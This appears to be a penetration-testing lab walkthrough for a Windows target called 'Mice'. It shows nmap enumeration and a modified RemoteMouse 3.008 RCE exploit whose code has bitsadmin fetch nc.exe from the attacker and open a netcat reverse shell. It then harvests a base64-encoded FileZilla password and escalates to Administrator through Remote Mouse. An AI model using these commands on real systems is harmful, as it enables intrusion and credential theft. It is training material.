@@ -1,0 +1,326 @@
+<div id="__BVID__15___BV_modal_content_" tabindex="-1" class="modal-content"><header id="__BVID__15___BV_modal_header_" class="modal-header"><h5 id="__BVID__15___BV_modal_title_" class="modal-title">Walkthrough</h5><button type="button" aria-label="Close" class="close">×</button></header><div id="__BVID__15___BV_modal_body_" class="modal-body"><div class="mb-2 flex-grow" on-finish="function() {
+    [native code]
+}"><div class="markdown-container"><div class="markdown-content text-main-color"><!----><div><h1>Mice Walkthrough</h1>
+<h2>Summary</h2>
+<p>In this walkthrough, we target the service running on port 1978 by using RemoteMouse 3.008 exploit which can be used to perform an arbitrary RCE. We launch the exploit after making some modifications in the code and then capture a reverse shell using Netcat. We explore the directories of the target to identify the location of FileZilla and then grab its password which is encoded using base64. After decoding the password, we login to the target system using Remote Desktop service. We launch the Remote Mouse application inside the target system, and open a Command Prompt session as administrator.</p>
+<h2>Enumeration</h2>
+<p>Let's enumerate the target by running a <code>Nmap</code> scan to find open ports and services.</p>
+<pre id="fence-code-1" class="fence-code"><code>┌──(kali㉿kali)-[~/mice_test]
+└─$ nmap -sC -sV -oN scan.txt 192.168.245.140 -Pn 
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 11:37 EDT
+Nmap scan report for 192.168.245.140
+Host is up (0.00045s latency).
+Not shown: 999 filtered ports
+PORT     STATE SERVICE       VERSION
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: REMOTE-PC
+|   NetBIOS_Domain_Name: REMOTE-PC
+|   NetBIOS_Computer_Name: REMOTE-PC
+|   DNS_Domain_Name: Remote-PC
+|   DNS_Computer_Name: Remote-PC
+|   Product_Version: 10.0.19041
+|_  System_Time: 2021-06-10T15:38:13+00:00
+| ssl-cert: Subject: commonName=Remote-PC
+| Not valid before: 2021-06-09T15:06:20
+|_Not valid after:  2021-12-09T15:06:20
+|_ssl-date: 2021-06-10T15:38:13+00:00; 0s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.42 seconds
+</code></pre>
+<p>We find that port 3389 is open by only checking the default common ports. Let's try to run a full port scan.</p>
+<pre id="fence-code-2" class="fence-code"><code>┌──(kali㉿kali)-[~/mice_test]
+└─$ nmap -sC -sV -oN scan_full.txt -p- -Pn 192.168.245.140
+Nmap scan report for 192.168.245.140
+Host is up (0.0013s latency).
+Not shown: 65531 filtered ports
+PORT     STATE SERVICE        VERSION
+1978/tcp open  unisql?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, ms-sql-s: 
+|_    SIN 15win nop nop 300
+1979/tcp open  unisql-java?
+1980/tcp open  pearldoc-xact?
+3389/tcp open  ms-wbt-server  Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: REMOTE-PC
+|   NetBIOS_Domain_Name: REMOTE-PC
+|   NetBIOS_Computer_Name: REMOTE-PC
+|   DNS_Domain_Name: Remote-PC
+|   DNS_Computer_Name: Remote-PC
+|   Product_Version: 10.0.19041
+|_  System_Time: 2021-06-10T12:21:20+00:00
+| ssl-cert: Subject: commonName=Remote-PC
+| Not valid before: 2021-06-09T12:10:35
+|_Not valid after:  2021-12-09T12:10:35
+|_ssl-date: 2021-06-10T12:21:48+00:00; 0s from scanner time.
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port1978-TCP:V=7.91%I=7%D=6/10%Time=60C2032A%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,15,"SIN\x2015win\x20nop\x20nop\x20300")%r(GenericLines,15,"SIN\x2015
+SF:win\x20nop\x20nop\x20300")%r(GetRequest,15,"SIN\x2015win\x20nop\x20nop\
+SF:x20300")%r(HTTPOptions,15,"SIN\x2015win\x20nop\x20nop\x20300")%r(RTSPRe
+SF:quest,15,"SIN\x2015win\x20nop\x20nop\x20300")%r(DNSVersionBindReqTCP,15
+SF:,"SIN\x2015win\x20nop\x20nop\x20300")%r(Help,15,"SIN\x2015win\x20nop\x2
+SF:0nop\x20300")%r(SSLSessionReq,15,"SIN\x2015win\x20nop\x20nop\x20300")%r
+SF:(TLSSessionReq,15,"SIN\x2015win\x20nop\x20nop\x20300")%r(FourOhFourRequ
+SF:est,15,"SIN\x2015win\x20nop\x20nop\x20300")%r(LPDString,15,"SIN\x2015wi
+SF:n\x20nop\x20nop\x20300")%r(LDAPSearchReq,15,"SIN\x2015win\x20nop\x20nop
+SF:\x20300")%r(LDAPBindReq,15,"SIN\x2015win\x20nop\x20nop\x20300")%r(SIPOp
+SF:tions,15,"SIN\x2015win\x20nop\x20nop\x20300")%r(LANDesk-RC,15,"SIN\x201
+SF:5win\x20nop\x20nop\x20300")%r(JavaRMI,15,"SIN\x2015win\x20nop\x20nop\x2
+SF:0300")%r(ms-sql-s,15,"SIN\x2015win\x20nop\x20nop\x20300");
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Jun 10 08:21:49 2021 -- 1 IP address (1 host up) scanned in 297.26 seconds
+</code></pre>
+<p>We find ports 1978, 1979, 1980, and 3389 are open. Nmap is unable to fingerprint port 1978. While searching for more info about this port, we don't find any useful information in Speed Guide's <a href="https://www.speedguide.net/port.php?port=1978" target="_blank">Port 1978 Details</a> page.</p>
+<p>After googling for exploits for <code>port 1978</code>, we find <a href="https://www.exploit-db.com/exploits/46697" target="_blank">RemoteMouse 3.008 - Arbitrary Remote Command Execution</a> exploit from ExploitDB. Let's try to confirm this using <code>Searchsploit</code>.</p>
+<pre id="fence-code-3" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ searchsploit remotemouse                                   
+------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                        |  Path
+------------------------------------------------------------------------------------------------------ ---------------------------------
+RemoteMouse 3.008 - Arbitrary Remote Command Execution                                                | windows/remote/46697.py
+------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+</code></pre>
+<p>Remote Mouse is a program that allows to turn a mobile device (Android or iOS) into a wireless keyboard or mouse for a PC/Laptop. It uses port <code>1978</code> for communication. For this we need to install it in our systems in conjunction with its sister Android or iOS app. This allows us to execute arbitrary programs as an “Administrator” by using the “Image Transfer Folder” feature.</p>
+<h2>Exploitation</h2>
+<p>Let's mirror the exploit into our present working directory using Searchsploit.</p>
+<pre id="fence-code-4" class="fence-code"><code>┌──(kali㉿kali)-[~/mice_test]
+└─$ searchsploit -m 46697                  
+  Exploit: RemoteMouse 3.008 - Arbitrary Remote Command Execution
+      URL: https://www.exploit-db.com/exploits/46697
+     Path: /usr/share/exploitdb/exploits/windows/remote/46697.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+
+Copied to: /home/kali/mice_test/46697.py
+</code></pre>
+<p>The exploit is just a proof of concept that pops up <code>calc.exe</code>. We need to modify the exploit to download <code>nc.exe</code> from our machine and spawn a reverse shell. Copy the following Python code a replace it in the place of <code>PopCalc()</code> function (inside <code>46697.py</code> file) and then save it.</p>
+<pre id="fence-code-5" class="fence-code"><code class="language-python">...
+...
+...
+
+cmd1='mkdir c:\\pwn'
+cmd2='bitsadmin /transfer job /download /priority high http://192.168.245.139/nc.exe c:\\pwn\\nc.exe'
+cmd3='c:\\pwn\\nc.exe -e cmd.exe 192.168.245.139 443'
+
+def PopCalc(ip):
+    MoveMouse(-5000,3000,ip)
+    MousePress(mouse.leftClick,ip)
+    sleep(1)
+    SendString("cmd.exe",ip)
+    sleep(1)
+    SendString("\n",ip)
+    sleep(1)
+    SendString(cmd1,ip)
+    sleep(1)
+    SendString("\n",ip)
+    sleep(1)
+    SendString(cmd2,ip)
+    sleep(1)
+    SendString("\n",ip)
+    sleep(25)
+    SendString(cmd3,ip)
+    sleep(1)
+    SendString("\n",ip)
+    print("SUCCESS!",ip)
+    
+...
+...
+...
+</code></pre>
+<blockquote>
+<p>Note: In the above code, we need to provide our Kali machine's IP address.</p>
+</blockquote>
+<p>Let's copy <code>nc.exe</code> to <code>/var/www/html</code> and then start <code>apache2</code> service.</p>
+<pre id="fence-code-6" class="fence-code"><code>┌──(kali㉿kali)-[~/mice_test]
+└─$ sudo cp /usr/share/windows-binaries/nc.exe /var/www/html
+
+┌──(kali㉿kali)-[~/mice_test]
+└─$ sudo systemctl start apache2
+</code></pre>
+<p>We start a <code>Netcat</code> listener to catch the reverse shell.</p>
+<pre id="fence-code-7" class="fence-code"><code>┌──(kali㉿kali)-[~/mice_test]
+└─$ sudo nc -nlvp 443                       
+[sudo] password for kali: 
+listening on [any] 443 ...
+</code></pre>
+<p>Now, we run the exploit providing the IP address of the target.</p>
+<pre id="fence-code-8" class="fence-code"><code>┌──(kali㉿kali)-[~/mice_test]
+└─$ python2 46697.py 192.168.245.140
+('SUCCESS!', '192.168.245.140')
+
+</code></pre>
+<p>Our Kali machine catches the reverse shell in the terminal where the <code>Netcat</code> session is listening.</p>
+<pre id="fence-code-9" class="fence-code"><code>┌──(kali㉿kali)-[~/mice_test]
+└─$ sudo nc -nlvp 443                       
+[sudo] password for kali: 
+listening on [any] 443 ...
+connect to [192.168.245.139] from (UNKNOWN) [192.168.245.140] 49726
+Microsoft Windows [Version 10.0.19043.1052]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\divine&gt;
+</code></pre>
+<p>We now have shell access on the target system.</p>
+<h2>Local Enumeration</h2>
+<p>While enumeration the target, we find that the <code>Filemicea FTP Client</code> is installed in <code>C:\Program Files</code> directory.</p>
+<pre id="fence-code-10" class="fence-code"><code>C:\Program Files&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7E75-475C
+
+ Directory of C:\Program Files
+
+10-06-2021  20:33    &lt;DIR&gt;          .
+10-06-2021  20:33    &lt;DIR&gt;          ..
+11-06-2021  06:11    &lt;DIR&gt;          Common Files
+10-06-2021  20:33    &lt;DIR&gt;          FileZilla FTP Client
+07-12-2019  15:21    &lt;DIR&gt;          Internet Explorer
+07-12-2019  14:44    &lt;DIR&gt;          ModifiableWindowsApps
+11-06-2021  05:50    &lt;DIR&gt;          MSBuild
+11-06-2021  05:50    &lt;DIR&gt;          Reference Assemblies
+10-06-2021  13:37    &lt;DIR&gt;          Sublime Text
+10-06-2021  13:33    &lt;DIR&gt;          VMware
+10-06-2021  20:22    &lt;DIR&gt;          Windows Defender
+11-06-2021  06:06    &lt;DIR&gt;          Windows Defender Advanced Threat Protection
+09-04-2021  19:23    &lt;DIR&gt;          Windows Mail
+09-04-2021  19:23    &lt;DIR&gt;          Windows Media Player
+07-12-2019  15:24    &lt;DIR&gt;          Windows Multimedia Platform
+07-12-2019  15:20    &lt;DIR&gt;          Windows NT
+09-04-2021  19:23    &lt;DIR&gt;          Windows Photo Viewer
+07-12-2019  15:24    &lt;DIR&gt;          Windows Portable Devices
+07-12-2019  15:01    &lt;DIR&gt;          Windows Security
+07-12-2019  15:01    &lt;DIR&gt;          WindowsPowerShell
+               0 File(s)              0 bytes
+              20 Dir(s)  10,001,031,168 bytes free
+</code></pre>
+<p>Let's check the hidden files inside <code>Users</code> directory using <code>/a</code> flag.</p>
+<pre id="fence-code-11" class="fence-code"><code>C:\Users\divine&gt;dir /a
+dir /a
+ Volume in drive C has no label.
+ Volume Serial Number is 7E75-475C
+
+ Directory of C:\Users\divine
+
+10-06-2021  20:38    &lt;DIR&gt;          .
+10-06-2021  20:38    &lt;DIR&gt;          ..
+10-06-2021  20:36    &lt;DIR&gt;          3D Objects
+10-06-2021  20:30    &lt;DIR&gt;          AppData
+10-06-2021  20:30    &lt;JUNCTION&gt;     Application Data [C:\Users\divine\AppData\Roaming]
+10-06-2021  20:36    &lt;DIR&gt;          Contacts
+10-06-2021  20:30    &lt;JUNCTION&gt;     Cookies [C:\Users\divine\AppData\Local\Microsoft\Windows\INetCookies]
+10-06-2021  20:36    &lt;DIR&gt;          Desktop
+10-06-2021  20:36    &lt;DIR&gt;          Documents
+10-06-2021  20:36    &lt;DIR&gt;          Downloads
+10-06-2021  20:36    &lt;DIR&gt;          Favorites
+10-06-2021  20:36    &lt;DIR&gt;          Links
+10-06-2021  20:30    &lt;JUNCTION&gt;     Local Settings [C:\Users\divine\AppData\Local]
+10-06-2021  20:36    &lt;DIR&gt;          Music
+10-06-2021  20:30    &lt;JUNCTION&gt;     My Documents [C:\Users\divine\Documents]
+10-06-2021  20:30    &lt;JUNCTION&gt;     NetHood [C:\Users\divine\AppData\Roaming\Microsoft\Windows\Network Shortcuts]
+10-06-2021  20:36         1,048,576 NTUSER.DAT
+10-06-2021  20:30           271,360 ntuser.dat.LOG1
+10-06-2021  20:30           356,352 ntuser.dat.LOG2
+10-06-2021  20:30            65,536 NTUSER.DAT{53b39e88-18c4-11ea-a811-000d3aa4692b}.TM.blf
+10-06-2021  20:30           524,288 NTUSER.DAT{53b39e88-18c4-11ea-a811-000d3aa4692b}.TMContainer00000000000000000001.regtrans-ms
+10-06-2021  20:30           524,288 NTUSER.DAT{53b39e88-18c4-11ea-a811-000d3aa4692b}.TMContainer00000000000000000002.regtrans-ms
+10-06-2021  20:30                20 ntuser.ini
+10-06-2021  20:38    &lt;DIR&gt;          OneDrive
+10-06-2021  20:37    &lt;DIR&gt;          Pictures
+10-06-2021  20:30    &lt;JUNCTION&gt;     PrintHood [C:\Users\divine\AppData\Roaming\Microsoft\Windows\Printer Shortcuts]
+10-06-2021  20:30    &lt;JUNCTION&gt;     Recent [C:\Users\divine\AppData\Roaming\Microsoft\Windows\Recent]
+10-06-2021  20:36    &lt;DIR&gt;          Saved Games
+10-06-2021  20:37    &lt;DIR&gt;          Searches
+10-06-2021  20:30    &lt;JUNCTION&gt;     SendTo [C:\Users\divine\AppData\Roaming\Microsoft\Windows\SendTo]
+10-06-2021  20:30    &lt;JUNCTION&gt;     Start Menu [C:\Users\divine\AppData\Roaming\Microsoft\Windows\Start Menu]
+10-06-2021  20:30    &lt;JUNCTION&gt;     Templates [C:\Users\divine\AppData\Roaming\Microsoft\Windows\Templates]
+10-06-2021  20:36    &lt;DIR&gt;          Videos
+               7 File(s)      2,790,420 bytes
+              26 Dir(s)  10,000,674,816 bytes free
+</code></pre>
+<p>FileZilla passwords are stored in the User's AppData directory in a file named <strong>recentservers.xml</strong>. Let's take a look.</p>
+<pre id="fence-code-12" class="fence-code"><code>C:\Users\divine\AppData\Roaming\FileZilla&gt;type recentservers.xml
+type recentservers.xml
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;FileZilla3 version="3.54.1" platform="windows"&gt;
+	&lt;RecentServers&gt;
+		&lt;Server&gt;
+			&lt;Host&gt;ftp.pg&lt;/Host&gt;
+			&lt;Port&gt;21&lt;/Port&gt;
+			&lt;Protocol&gt;0&lt;/Protocol&gt;
+			&lt;Type&gt;0&lt;/Type&gt;
+			&lt;User&gt;divine&lt;/User&gt;
+			&lt;Pass encoding="base64"&gt;Q29udHJvbEZyZWFrMTE=&lt;/Pass&gt;
+			&lt;Logontype&gt;1&lt;/Logontype&gt;
+			&lt;PasvMode&gt;MODE_DEFAULT&lt;/PasvMode&gt;
+			&lt;EncodingType&gt;Auto&lt;/EncodingType&gt;
+			&lt;BypassProxy&gt;0&lt;/BypassProxy&gt;
+		&lt;/Server&gt;
+	&lt;/RecentServers&gt;
+&lt;/FileZilla3&gt;
+</code></pre>
+<p>We find the password in this file which is encoded using <code>base64</code>. Let's decode it to get the password in plaintext.</p>
+<pre id="fence-code-13" class="fence-code"><code>┌──(kali㉿kali)-[~/mice_test]
+└─$ echo Q29udHJvbEZyZWFrMTE= | base64 -d                                                                        
+ControlFreak11
+</code></pre>
+<p>We get the password in plaintext.</p>
+<h2>Escalation</h2>
+<p>Let's try to login as <code>divine</code> using the password <code>ControlFreak11</code> via RDP (Remote Desktop Protocol).</p>
+<pre id="fence-code-14" class="fence-code"><code>┌──(kali㉿kali)-[~/mice_test]
+└─$ rdesktop 192.168.245.140
+</code></pre>
+<p>A new RDP (Windows) window will be opened. We can see that the <code>Remote Mouse</code> is installed and can be seen on the desktop that it runs with admin privileges (shield icon).</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_114_image_1_nSus9d1e.png" alt="1.png">
+<figcaption>1.png</figcaption>
+</figure>
+<p></p>
+<p>let's open the <code>Remote Mouse</code> application from the system tray.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_114_image_2_60c88mRQ.png" alt="2.png">
+<figcaption>2.png</figcaption>
+</figure>
+<p></p>
+<p>We go to the <code>Settings</code> tab in the application window and then click on the <code>Change...</code> button in <code>Image Transfer Folder</code> section.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_114_image_3_zw7rEYby.png" alt="3.png">
+<figcaption>3.png</figcaption>
+</figure>
+<p></p>
+<p>We need to click on the <code>OK</code> button when we receive and error prompt.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_114_image_4_gOn4FhWS.png" alt="4.png">
+<figcaption>4.png</figcaption>
+</figure>
+<p></p>
+<p>An explorer window is appears which prompts to choose a location for <code>Image Transfer Folder</code>.</p>
+<p>We need to remove the path and replace it with <code>C:\Windows\System32\cmd.exe</code> in the address bar.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_114_image_5_cqJt15ql.png" alt="5.png">
+<figcaption>5.png</figcaption>
+</figure>
+<p></p>
+<p>Here, we can see that a <code>Command Prompt</code> is spawned with <code>Administrator</code> privileges.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_114_image_6_zS326FBq.png" alt="6.png">
+<figcaption>6.png</figcaption>
+</figure>
+<p></p>
+<p>We now have Administrator access on the target system.</p>
+</div><!----></div></div><div class="d-flex flex-row full-width mt-4 mb-1 justify-content-end"><button type="button" class="btn transparent-btn mb-2 pl-0 pr-0 btn-link btn-lg">
+      Close
+    </button><!----></div></div></div><!----></div>
